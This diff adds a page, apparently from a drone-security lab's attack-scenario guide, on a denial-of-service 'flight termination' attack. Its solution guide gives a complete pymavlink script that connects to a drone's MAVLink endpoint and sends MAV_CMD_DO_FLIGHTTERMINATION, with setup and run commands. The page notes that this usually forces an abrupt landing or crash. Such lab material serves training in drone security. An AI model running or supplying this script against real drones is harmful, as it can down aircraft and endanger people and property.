@@ -1,0 +1,103 @@
+title: Flight Termination
+order: 5
+description: Forcefully terminate the drone's flight
+breadcrumb:
+  - text: Attack Scenarios
+    link: /attacks
+  - text: Denial of Service
+  - text: Flight Termination Attack
+
+sections:
+  - title: Description
+    content: |
+      The Flight Termination involves sending the a command to the drone causing it to immediately terminate its current flight operation. 
+      This command instructs the drone to immediately stop its flight, usually resulting in an abrupt landing 
+      or crash.
+
+  - title: Resources
+    content:
+      - text: MAVLink Protocol
+        link: https://mavlink.io/en/
+      - text: MAVLink Commands
+        link: https://mavlink.io/en/messages/common.html#mav_commands
+
+  - title: Solution Guide
+    collapsible: true
+    steps:
+      - title: Step 1. Setup
+        description: |
+          Ensure you have Python and the necessary libraries installed:
+          ```sudo apt-get update
+          sudo apt-get install python3 python3-pip
+          pip3 install pymavlink
+          ```
+
+      - title: Step 2. Create the Script
+        description: |
+          Create a Python script named `flight_termination.py` and paste the following code:
+          ```from pymavlink import mavutil
+          import sys
+
+          def connect_drone(target_ip, target_port):
+              """
+              Establish a connection to the drone.
+              """
+              master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
+              master.wait_heartbeat()
+              print("Connected to the drone.")
+              return master
+
+          def execute_flight_termination(master):
+              """
+              Send the MAV_CMD_DO_FLIGHTTERMINATION command to terminate the flight.
+              """
+              master.mav.command_long_send(
+                  master.target_system,                # Target system ID
+                  master.target_component,             # Target component ID
+                  mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION, # Command ID for flight termination
+                  0,                                   # Confirmation
+                  1,                                   # Param1: 1 to initiate flight termination
+                  0, 0, 0, 0, 0, 0                     # Other params unused
+              )
+              print("Flight termination command sent.")
+
+          def main(target_ip, target_port):
+              # Connect to the drone
+              master = connect_drone(target_ip, target_port)
+
+              # Execute the flight termination
+              execute_flight_termination(master)
+
+              # Optionally, monitor the drone's status
+              while True:
+                  msg = master.recv_match(blocking=True)
+                  if not msg:
+                      continue
+                  print(f"Received message: {msg}")
+                  if msg.get_type() == 'COMMAND_ACK':
+                      if msg.command == mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION:
+                          if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
+                              print("Flight termination command accepted.")
+                          else:
+                              print(f"Failed to execute flight termination command: {msg.result}")
+                      break
+
+          if __name__ == "__main__":
+              if len(sys.argv) != 2:
+                  print("Usage: python flight_termination.py <target_ip:target_port>")
+                  sys.exit(1)
+
+              target = sys.argv[1]
+              target_ip, target_port = target.split(':')
+              target_port = int(target_port)
+
+              # Execute the script
+              main(target_ip, target_port)
+          ```
+
+      - title: Step 3. Run the Script
+        description: |
+          Execute the script with sudo and the target IP and port of the drone:
+          ```sudo python flight_termination.py (IP:PORT)
+          ```
+          Replace `(IP:PORT)` with the actual IP address and port of the drone, for example `10.13.0.3:5760`. The script will send the flight termination command, which will immediately stop the drone's flight.
